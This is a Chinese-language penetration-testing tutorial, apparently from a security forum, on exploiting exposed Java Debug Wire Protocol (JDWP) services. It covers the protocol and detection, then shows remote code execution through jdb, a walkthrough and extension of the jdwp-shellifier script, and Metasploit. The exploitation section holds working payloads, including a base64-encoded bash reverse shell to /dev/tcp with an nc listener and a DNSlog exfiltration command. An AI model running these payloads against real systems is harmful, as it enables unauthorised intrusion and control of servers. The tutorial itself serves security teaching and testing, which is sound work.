0x1前言
=====

JDWP是为Java调试而设计的通讯交互协议，在渗透测试的过程中，如果遇到目标开启了JDWP服务，就可以利用JDWP实现远程代码执行

0x2JDWP介绍
=========

JDWP（Java Debug Wire Protocol，Java调试线协议）是一个为Java调试而设计的通讯交互协议，它定义了调试器（Debugger）和被调试JVM（Debuggee）进程之间的交互数据的传递格式，它详细完整地定义了请求命令、回应数据和错误代码，保证了调试端和被调试端之间通信通畅。

JDWP是JVM或者类JVM的虚拟机都支持的一种协议，通过该协议，Debugger端和被调试JVM之间进行通信，可以获取被调试JVM的包括类、对象、线程等信息

通信过程
----

JDWP 通信大致可分为两个阶段：握手和应答。握手是在传输层连接建立完成后做的第一件事。

JDWP的握手过程非常简单，我们可以使用Wireshark抓包来看看握手包

首先Debugger端会发送 14 bytes 的字符串 “JDWP-Handshake” 到被调试JVM端

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-343e9117a6b8b7b8b314c7de6b6a162ab0b522c1.png)

而被调试JVM端同样会回复 “JDWP-Handshake” 字符串，这样就完成了握手过程

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-d845349844683a3e64b0fa22255cc2d2c035519e.png)

握手完成后，Debugger端和被调试的JVM端就可以进行通信了，JDWP 是通过发送命令包（Command Packet）和回复包（Reply Packet）进行通信的。

注意：Debugger端和被调试JVM端都有可能发送Command Packet。Debugger端通过发送 Command Packet 获取被调试JVM端的信息以及控制程序的执行。被调试JVM端通过发送 Command Packet 通知 Debugger端某些事件的发生，如到达断点或是产生异常。

Reply Packet 是用来回复 Command Packet 该命令是否执行成功，如果成功 Reply Packet 还有可能包含 Command Packet 请求的数据，比如当前的线程信息或者变量的值。从被调试JVM端发送的事件消息是不需要回复的。

还有一点需要注意的是，JDWP 是异步的：Command Packet 的发送方不需要等待接收到 Reply Packet 就可以继续发送下一个 Command Packet。

数据包结构
-----

数据包由包头（Header）和数据（Data）两部分组成。包头部分的结构和长度是固定，而数据部分的长度是可变的，具体内容视数据包的内容而定。Command Packet 和 Reply Packet 的包头长度相同，都是 11 个 bytes，这样更有利于传输层的抽象和实现。

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-492acbc395ca7e8a6712e744c5ad7a18e4056765.png)

数据包各部分解释：

- **Length**：表示整个数据包的长度。因为包头的长度是固定的 11 bytes，所以如果一个 Command Packet 没有数据部分，则 Length 的值就是 11。
- **Id**：是一个唯一值，用来标记和识别 Reply Packet 对应的 Command Packet。Reply Packet 与它所回复的 Command Packet 具有相同的 Id，异步的消息就是通过 Id 来配对识别的。
- **Flags**：用来标识数据包是 Command Packet 还是 Reply Packet，如果Flags是0x80就表示是一个Reply Packet，如果Flags是0就表示是一个 Command Packet。
- **Command Set**：用来定义Command的类别，相当于一个Command的分组，一些功能相近的Command被分在同一个Command Set中。Command Set的值被划分为 3 个部分：  
    0-63：从debugger端发往被调试JVM的命令；  
    64–127：从被调试JVM的命令发往debugger端的命令；  
    128–256：预留的自定义和扩展命令
- **Error Code**：用来表示被回复的命令是否被正确执行了。零表示正确，非零表示执行错误。
- **Data**：数据部分的内容和结构依据不同的 Command Packet 和 Reply Packet 都有所不同。比如请求一个对象成员变量值的Command Packet，它的data中就包含该对象的id和成员变量的id。而 Reply Packet 中则包含该成员变量的值。

使用Wireshark抓包来分析Command Packet和Reply Packet

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-7922db999c158745f23f0d1c0de37205eedb3ce9.png)

在这个整个数据包中Data段就是JDWP数据包内容，前4个字节用来表示JDWP数据包的长度，这里为`0000000b`转换成十进制就是11，也就是说当前整个JDWP数据包的长度为11个字节，说明这个JDWP数据包只有包头部分。接下来4个字节为Id标识符，这里为`00000009`。再接下来1个字节为Flags，这里为0，表示当前是一个Command Packet，也就是说最后2个字节分别是Command Set和Command，这里都为1，表示向被调试JVM端获取目标JVM实现的JDWP版本信息。

关于Command Set和Command的规定值可以通过如下链接查询

<https://docs.oracle.com/javase/8/docs/platform/jpda/jdwp/jdwp-protocol.html>

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-534b988754e6f6591620e7659bc64961516c47fc.png)

上面Command Packet的Id标识符为9，因为Command Packet和Reply Packet的Id标识符要相同，所以对应的Reply Packet就可以找到为如下数据包

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-5b6134e3e31b99aac23100ab2b3a101f19bf8790.png)

同样前4个字节表示Reply Packet数据包的长度，这里为`000000e3`，转换成十进制为227，减去包头的11个字节，数据部分就有216个字节，包头部分中Flags为0x80表示当前是Reply Packet数据包，Error Code为0表示命令正确执行，剩下216个字节就是数据部分，返回的是目标JVM实现的JDWP版本信息以及JVM版本信息

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-73342202b442de779d3a68656e493098497fcea2.png)

调试命令介绍
------

可以执行如下命令以调试模式启动要被调试的应用程序

对于 Java 1.3版本使用命令：

```shell
java -Xnoagent -Djava.compiler=NONE -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000 <ProgramName>
```

对于 Java 1.4版本使用命令：

```shell
java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000 <ProgramName>
```

对于 Java 1.5 或更高版本使用命令：

```shell
java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000 <ProgramName>
```

由于 Java 9.0 JDWP 默认只支持本地连接。<http://www.oracle.com/technetwork/java/javase/9-notes-3745703.html#JDK-8041435>  
对于远程调试，应该使用 `*:` 地址运行程序：

```shell
java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:8000 <ProgramName>
```

使用 Maven 调试 Spring Boot 应用程序：

```shell
mvn spring-boot:run -Drun.jvmArguments=**"-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8001"
```

使用maven启动应用程序，执行mvnDebug命令，在启动应用程序的同时会自动配置远程调试。之后，我们只需在端口 8000 上附加调试器即可，maven会为我们解决所有环境问题。

可选参数介绍：

- **transport**：指定运行的被调试应用程序和调试器之间的通信协议，有如下可选值： 
    - dt\_socket：采用socket方式连接（常用）
    - dt\_shmem：采用共享内存的方式连接，支持有限，仅仅支持windows平台
- **server**：指定当前应用是否作为调试服务端，默认的值为n，表示当前应用作为客户端。如果你想将当前应用作为被调试应用，设置该值为y；如果你想将当前应用作为客户端，作为调试的发起者，设置该值为n。
- **address**：指定监听的端口，默认值是8000，注意：此端口不能和项目同一个端口，且未被占用以及对外开放。
- **suspend**：当前应用启动后，是否阻塞应用直到被连接，默认值为y（阻塞）。大部分情况下这个值应该为n，即不需要阻塞等待连接。一个可能为y的应用场景是，你的程序在启动时出现了一个故障，为了调试，必须等到调试方连接上来后程序再启动。
- **onthrow**：这个参数的意思是当程序抛出指定异常时，则中断调试。
- **onuncaught**：当程序抛出未捕获异常时，是否中断调试，默认值为n。
- **launch**：当调试中断时，执行的程序。
- **timeout**：超时时间(ms毫秒)，当设置 suspend=y 时，该参数表示等待连接的超时时间；当设置 suspend=n 时，该参数表示连接后的使用超时时间

0x3攻击JDWP服务
===========

在渗透测试的过程中，如果遇到目标Java应用开启了JDWP服务且没有配置访问控制的情况下，就可以利用JDWP实现远程代码执行。

环境搭建
----

为了在本地调试服务器上的代码，可以将服务器上的Tomcat以debug模式启动

### 在Windows下

下载Tomcat到本地，在`bin\startup.bat`文件中添加如下代码开启debug模式：

```shell
SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-abb689fbadf20af7215f14f85e89236f19e090d3.png)

在文件开头插入上述一行代码，然后点击运行 `startup.bat` 就会以debug模式启动Tomcat

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e618aef15fa6586c1d0107513394f13436821b53.png)

在输出信息中可以看到 `Listening for transport dt_socket at address: 8000`，表示JDWP服务已经监听在8000端口，等待调试器连接。

### 在Linux下

首先执行如下命令安装Tomcat：

```shell
# 执行wget命令下载Tomcat安装包
wget http://mirror.bit.edu.cn/apache/tomcat/tomcat-8/v8.5.43/bin/apache-tomcat-8.5.43.tar.gz

# 解压安装包
tar zxvf apache-tomcat-8.5.43.tar.gz

# 将程序安装包复制到指定运行目录下
sudo mv apache-tomcat-8.5.43 /usr/local/tomcat8
```

启动方式一：

进入Tomcat安装目录下的bin目录下找到 `catalina.sh` 文件，在文件开头部分添加如下一行：

```shell
CATALINA_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=*:8000"
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-074b6a0c213fb68f0c7a2bd13d1683dc593f8101.png)

修改完成后，执行脚本`./startup.sh`就会以debug模式启动Tomcat

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-22c337afdd0661e46ce4555c088e0ee4be930580.png)

启动方式二：

进入Tomcat的bin目录，输入 `./catalina.sh jpda run` 或者 `./catalina.sh jpda start` 命令以调试模式启动tomcat。  
启动时就会出现如下信息提示：  
`Listening for transport dt_socket at address: 8000`

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-964d17e6628853b90aa0269355e314fe689acf3d.png)

注意脚本中默认配置JDWP是监听在本地的8000端口，修改`JDPA_ADDRESS`的值对外开放此端口，在JDK9及以上的版本需要修改为`JDPA_ADDRESS=*:8000` ，在JDK9以下版本修改为`JDPA_ADDRESS=8000` 即可

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-bd9835eb71738054ff2b4df71974c41ad91b9ec7.png)

漏洞检测
----

有三种常用方式来进行JDWP服务探测，原理都是一样的，即向目标端口连接后发送JDWP-Handshake，如果目标服务直接返回一样的内容则说明是JDWP服务。

### 使用Nmap扫描

扫描会识别到JDWP服务，且有对应的JDK版本信息

```shell
nmap -sT -sV 192.168.192.1 -p 8000
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-27b8a67e7cc55d8bf1f64770061576eece63e2c2.png)

### 使用Telnet命令探测

使用Telnet命令探测，需要马上输入JDWP-Handshake，然后服务端返回一样的内容，证明是JDWP服务

```shell
telnet 192.168.182.130 8000
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-a2faec8f4b551b00e613bf050b72f79177732b8d.png)

注意：需要马上输入JDWP-Handshake，并按下回车，不然马上就会断开。在Linux系统下使用telnet测试可以，在Windows系统下使用telnet测试不太行

### 使用Python脚本探测

使用如下脚本扫描也可以，直接连接目标服务器，并向目标发送JDWP-Handshake，如果能接收到相同内容则说明目标是开启了JDWP服务

```python
import socket

host = "192.168.182.130"
port = 8000
try:
    client = socket.socket()
    client.connect((host, port))
    client.send(b"JDWP-Handshake")
    if client.recv(1024) == b"JDWP-Handshake":
        print("[*] {}:{} Listening JDWP Service! ".format(host, port))
except Exception as e:
    print("[-] Connection failed! ")
finally:
    client.close()
```

漏洞利用
----

### 利用JDB工具

jdb是JDK中自带的命令行调试工具，执行如下命令连接远程JDWP服务

```shell
jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.182.130,port=8000
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-fb6c3ebfdb7cab84685c466bd9eb4ca72b507e7b.png)

接下来执行threads命令查看所有线程

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-f6dc7cf71cd480f6c3174a62e24eb6269b13b7a2.png)

执行 `thread <线程id>` 命令选择指定线程，例如执行 `thread 0xc6a` 命令选择一个sleeping的线程，接下来执行`stepi`命令进入该线程（stepi命令用于执行当前指定，启动休眠的线程）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-659996f28c077910819266a61a9befc06edb9a81.png)

接下来可以通过 `print|dump|eval` 命令，执行Java表达式从而达成命令执行

```shell
eval java.lang.Runtime.getRuntime().exec("whoami")
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-35ae162600326cbd051c3624788d4f9ff28fe406.png)

这里是使用`java.lang.Runtime`去执行系统命令，可以看到命令是执行成功，返回了一个Process对象，我们可以使用dnslog平台查询命令执行的结果

另外使用`java.lang.Runtime`执行系统命令有个坑点，就是执行的命令中如果包含特殊符号，执行命令可能就会执行不成功，解决办法就是对要执行的命令进行编码处理，可以通过如下网站帮助我们生成命令执行的Payload

<https://www.jackson-t.ca/runtime-exec-payloads.html>

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-af5b53e0a5175c351b46e2c69258ee07878a13df.png)

执行编码处理后的命令

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-185bbe6400385de70cf4af160efc2b1296d885d6.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-7a16fb21e53e2cdcc1d662569d8f5744c8e773c6.png)

可以看到在Dnslog平台成功收到命令执行的回显结果

### 利用jdwp-shellifier脚本

漏洞利用脚本1：<https://github.com/IOActive/jdwp-shellifier>  
jdwp-shellifier是使用Python2编写的，该工具通过编写了一个JDI（JDWP客户端），以下断点的方式来获取线程上下文从而调用方法执行命令。

漏洞利用脚本2：<https://github.com/Lz1y/jdwp-shellifier>  
该脚本是在上面一个漏洞利用脚本的基础上，修改利用方式为通过对Sleeping的线程发送单步执行事件，达成断点，从而可以直接获取上下文、执行命令，而不用等待断点被击中。

#### 脚本分析

下面来分析下漏洞利用脚本，借助分析漏洞利用脚本，了解漏洞利用过程

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-97f1a051cb7c4d97d9ce54ceb4453244e57b6b68.png)

在脚本中首先是接收命令输入的参数并解析，接下来会运行start方法

```python
def start(self):
    self.handshake(self.host, self.port)
    self.idsizes()
    self.getversion()
    self.allclasses()
    return
```

在start方法中首先调用handshake方法，这个方法用于和目标JVM进行握手，建立连接。接下来调用idsizes方法，在这个方法中会向目标JVM发送`(VirtualMachine, IDSizes)`命令获取目标 JVM 中可变大小数据类型的大小

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-81b4421abd966d143fb570a4d9394c5f02995a91.png)

命令执行成功将会返回fieldID、methodID、objectID、referenceTypeID、frameID这些数据类型在目标JVM中所占的字节大小，后续我们发送的数据都要遵循规定的字节大小

接下来调用getversion方法，在这个方法中会向目标JVM发送`(VirtualMachine, Version)`命令获取目标JVM实现的JDWP版本号以及JVM版本号

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-1ccd1f494f746a11c60eca75c360e1846f5c6658.png)

最后调用allclasses方法，在这个方法中会向目标JVM发送`(VirtualMachine, AllClasses)`命令获取目标 JVM 当前加载的所有类的引用类型。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-570e1f3484060cf5176afbbf178895c68ca16d94.png)

执行完start方法，接下来就会调用runtime\_exec方法

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-279de8ccabe369931cd2e33b8ed6bfaf7b506c05.png)

首先看runtime\_exec方法中第一部分代码，调用get\_class\_by\_name方法，用于从前面获取到的目标JVM所有类信息中提取出`java.lang.Runtime`类信息

```python
# 1. get Runtime class reference
runtimeClass = jdwp.get_class_by_name("Ljava/lang/Runtime;")
if runtimeClass is None:
    print ("[-] Cannot find class Runtime")
    return False
print ("[+] Found Runtime class: id=%x" % runtimeClass["refTypeId"])
```

接下来看第二部分代码

```python
# 2. get getRuntime() meth reference
jdwp.get_methods(runtimeClass["refTypeId"])
getRuntimeMeth = jdwp.get_method_by_name("getRuntime")
if getRuntimeMeth is None:
    print ("[-] Cannot find method Runtime.getRuntime()")
    return False
print ("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth["methodId"])
```

首先调用get\_methods方法，在这个方法中会向目标JVM发送`(ReferenceType, Methods)`命令根据Runtime类的refTypeId获取类中所有方法的信息。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-9abd1398b340b1467869037839d521a2c0df1385.png)

接下来调用`get_method_by_name("getRuntime")`方法，用于从获取到的所有方法信息中提取getRuntime方法的信息

接下来看第三部分代码，调用send\_event方法用于在频繁调用的方法上设置断点，当我们没有指定断点时，默认是在`java.net.ServerSocket.accept()`方法加上断点。设置在`java.lang.String.indexOf()`方法上加断点脚本执行会更快速

```python
# 3. setup breakpoint on frequently called method
c = jdwp.get_class_by_name( args.break_on_class )
if c is None:
    print("[-] Could not access class '%s'" % args.break_on_class)
    print("[-] It is possible that this class is not used by application")
    print("[-] Test with another one with option `--break-on`")
    return False

jdwp.get_methods( c["refTypeId"] )
m = jdwp.get_method_by_name( args.break_on_method )
if m is None:
    print("[-] Could not access method '%s'" % args.break_on)
    return False

loc = chr( TYPE_CLASS )
loc+= jdwp.format( jdwp.referenceTypeIDSize, c["refTypeId"] )
loc+= jdwp.format( jdwp.methodIDSize, m["methodId"] )
loc+= struct.pack(">II", 0, 0)
data = [ (MODKIND_LOCATIONONLY, loc), ]
rId = jdwp.send_event( EVENT_BREAKPOINT, *data )
print ("[+] Created break event id=%x" % rId)
```

接下来看第四部分代码，调用resumevm方法用于恢复被挂起或停止的程序运行，然后等待程序运行至断点处，当断点触发时，我们就可以得到被调试方法所运行的线程ID，最后调用clear\_event方法清除断点

```python
# 4. resume vm and wait for event
jdwp.resumevm()

print ("[+] Waiting for an event on '%s'" % args.break_on)
while True:
    buf = jdwp.wait_for_event()
    ret = jdwp.parse_event_breakpoint(buf, rId)
    if ret is not None:
        break

rId, tId, loc = ret
print ("[+] Received matching event from thread %#x" % tId)

jdwp.clear_event(EVENT_BREAKPOINT, rId)
```

接下来看第五部分代码，如果我们指定了要执行的命令，接下来就会调用runtime\_exec\_payload方法执行我们自定义的命令

```python
# 5. Now we can execute any code
if args.cmd:
    runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd)
else:
    # by default, only prints out few system properties
    runtime_exec_info(jdwp, tId)
```

runtime\_exec\_payload方法定义如下

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-bca9ea0ef781167eb10acfc603388b931948fd4a.png)

首先看runtime\_exec\_payload方法的第一部分代码，调用了createstring方法，用于将要执行的命令在目标JVM中创建为字符串对象

```python
# 1. allocating string containing our command to exec()
cmdObjIds = jdwp.createstring( command )
if len(cmdObjIds) == 0:
    print ("[-] Failed to allocate command")
    return False
cmdObjId = cmdObjIds[0]["objId"]
print ("[+] Command string object created id:%x" % cmdObjId)
```

在createstring方法中会向目标JVM发送`(VirtualMachine, CreateString)`命令在目标 JVM 中创建指定字符串的字符串对象并返回其ID。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-5f9dc78cad26509fa9d43f43c786c73db570f441.png)

接下来看第二部分代码，调用了invokestatic方法

```python
# 2. use context to get Runtime object
buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
if buf[0] != chr(TAG_OBJECT):
    print ("[-] Unexpected returned type: expecting Object")
    return False
rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])

if rt is None:
    print "[-] Failed to invoke Runtime.getRuntime()"
    return False
print ("[+] Runtime.getRuntime() returned context id:%#x" % rt)
```

在invokestatic方法中会向目标JVM发送`(ClassType, InvokeMethod)`命令调用指定类的静态方法。这里是用于调用Runtime类的静态方法getRuntime方法，来获取一个Runtime实例对象。这里调用静态方法需要传入我们前面获取的Runtime类的refTypeId、threadID、getRuntime方法的methodId，如果调用成功就会返回Runtime对象ID

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-80823a29533a3c1897372760b5a8d956a48be7ed.png)

接下来看第三部分代码，调用了get\_method\_by\_name方法，用于从获取exec方法的信息

```python
# 3. find exec() method
execMeth = jdwp.get_method_by_name("exec")
if execMeth is None:
    print ("[-] Cannot find method Runtime.exec()")
    return False
print ("[+] found Runtime.exec(): id=%x" % execMeth["methodId"])
```

接下来看第四部分代码，调用了invoke方法

```python
# 4. call exec() in this context with the alloc-ed string
data = [ chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmdObjId) ]
buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth["methodId"], *data)
if buf[0] != chr(TAG_OBJECT):
    print ("[-] Unexpected returned type: expecting Object")
    return False

retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
print ("[+] Runtime.exec() successful, retId=%x" % retId)
```

在invoke方法中会向目标JVM发送`(ObjectReference, InvokeMethod)`命令调用指定对象的实例方法。这里用于调用Runtime对象的exec方法执行我们的命令，这里调用方法需要传入Runtime对象ID、threadID、Runtime类的refTypeId、exec方法的methodId，以及将前面创建的命令字符串对象ID作为参数传入，如果命令执行成功就会返回一个Process对象ID

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-854f4200e0545e8b7398329e568bcc4bf78f12b2.png)

至此脚本利用过程就分析完了，下面来利用脚本执行命令

#### 脚本利用

执行系统命令

```shell
python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on "java.lang.String.indexOf" --cmd "whoami"
```

运行脚本显示命令执行成功，但是没有回显

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-2e255baf5af2272d9e0bf52eabd616e17471a954.png)

通过DnsLog平台查看命令执行的回显结果，注意执行的命令同样需要编码处理

```shell
python2 jdwp-shellifier.py -t 192.168.182.130 -p 8000 --break-on "java.lang.String.indexOf" --cmd "bash -c {echo,cGluZyBgd2hvYW1pYC56YjN6OHEuZG5zbG9nLmNu}|{base64,-d}|{bash,-i}"
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-8e1114d932c97067b44d3951bc960095a9b0c469.png)

反弹Shell

本地NC监听：

```shell
nc -lvp 6666
```

将反弹Shell的命令进行编码处理

```shell
/bin/bash -i >& /dev/tcp/192.168.182.129/6666 0>&1
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-3247580105807bb3fe38d3b30590bf8c0493dbc9.png)

利用脚本执行反弹Shell的命令

```shell
python2 jdwp-shellifier.py -t 192.168.182.130 -p 8000 --break-on "java.lang.String.indexOf" --cmd "bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTgyLjEyOS82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}"
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-668d2ddb8aa254985ccf48701986f8d03968655f.png)

#### 脚本改造

使用jdwp-shellifier脚本执行命令默认是没有回显的，脚本是使用Runtime类的exec方法执行命令，仅实现了执行命令的功能，没有实现将命令执行的结果回显出来，下面改造下脚本实现命令执行回显

在Java中可以使用如下代码执行命令并将命令执行结果输出：

```java
Process process = Runtime.getRuntime().exec("id");
InputStream input = process.getInputStream();
InputStreamReader isr = new InputStreamReader(input);
BufferedReader br = new BufferedReader(isr);
String line = null;
while ((line = br.readLine()) != null) {
    System.out.println(line);
}
```

通过前面的分析我们知道jdwp-shellifier脚本是实现了第一行代码的功能，执行我们的命令返回一个Process对象，我们可以照着Java代码来一步步实现命令执行结果回显

首先是实现调用Process对象的getInputStream方法，可以通过向被调试JVM端发送`(ObjectReference, InvokeMethod)`命令来调用指定对象的指定方法，执行方法调用要传入Process类的refTypeId和getInputStream方法的methodId，所以需要先获取这两个信息，然后再执行方法调用，编写如下代码实现功能，如果调用方法成功就会返回InputStream对象ID

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-6235609209e9302d80ba9c6323bb2ab8701832e7.png)

下一步是实现得到一个InputStreamReader实例化对象，可以通过向被调试JVM端发送`(ClassType, NewInstance)`命令调用类的指定构造方法来创建实例化对象，创建InputStreamReader对象要传入InputStreamReader类的refTypeId和指定构造方法的methodId

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-81f6a7d7bdf9a42d2eeba301a122666b62627136.png)

另外还要将前面获取到的InputStream对象ID作为参数传入，编写如下代码实现功能，如果执行成功就会返回InputStreamReader对象ID

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-9fd424e2d9b227249f6ecc8a57bc4c1cb8eaed28.png)

再下一步是实现得到一个BufferedReader实例化对象，同样是调用指定构造方法，将InputStreamReader对象ID作为参数传入，编写如下代码实现功能，如果执行成功就会返回BufferedReader对象ID

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e60c1bec13d9487cdd8ff63d170366c200ebc5f1.png)

最后一步就是循环调用readLine方法，逐行读取命令执行的结果

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-4e2786bc1bfc2934a260fce7d2461494d47d8441.png)

注意这里调用方法返回的是String Object ID，还需要向被调试JVM端发送`(StringReference, Value)`命令来获取字符串内容

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-77ae841823079a64a599f5d3ebab06e1d1209df9.png)

改造完脚本，测试下利用脚本执行id命令

```shell
python2 jdwp-shellifier.py -t 192.168.182.130 -p 8000 --break-on "java.lang.String.indexOf" --cmd "id"
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-955ed9398e9bc2b0279f9fe8e0785f6a20762fca.png)

可以看到现在能正常回显命令执行的结果了

完整代码已上传至GitHub：<https://github.com/r3change/jdwp-shellifier>

### 利用MSF的漏洞利用模块

还可以使用Metasploit自带的漏洞利用模块`exploit/multi/misc/java_jdwp_debugger`进行漏洞利用

```shell
msf5 > use exploit/multi/misc/java_jdwp_debugger
msf5 exploit(multi/misc/java_jdwp_debugger) > set rhosts 192.168.182.129
msf5 exploit(multi/misc/java_jdwp_debugger) > set payload linux/x64/shell/bind_tcp 
msf5 exploit(multi/misc/java_jdwp_debugger) > run
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-d915a808036fbec74ba63c339a0efa210c4f836a.png)

修复建议
----

关闭JDWP服务，或者JDWP服务监听的端口不对公网开放

0x4总结
=====

本文对JDWP协议的通信过程、数据包结构进行了分析，当目标开启了JDWP服务时，可以利用JDWP实现远程代码执行，本文介绍了三种漏洞利用方法。